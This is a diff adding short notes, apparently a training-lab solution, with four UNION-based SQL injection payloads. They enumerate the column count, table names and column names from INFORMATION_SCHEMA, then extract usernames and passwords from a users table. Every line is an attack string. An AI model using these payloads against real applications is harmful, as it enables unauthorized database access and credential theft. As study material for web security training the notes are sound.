@@ -1,0 +1,11 @@
+Finding Column :
+' UNION SELECT NULL, NULL -- -
+
+Finding table name :
+' UNION SELECT 'asd', table_name FROM INFORMATION_SCHEMA.TABLES ORDER BY 2 -- -
+
+Finding column name :
+' UNION SELECT 'asd', column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users_alumxi' -- -
+
+Finding username and password :
+' UNION SELECT username_tcswry, password_fvglyw FROM users_alumxi -- -
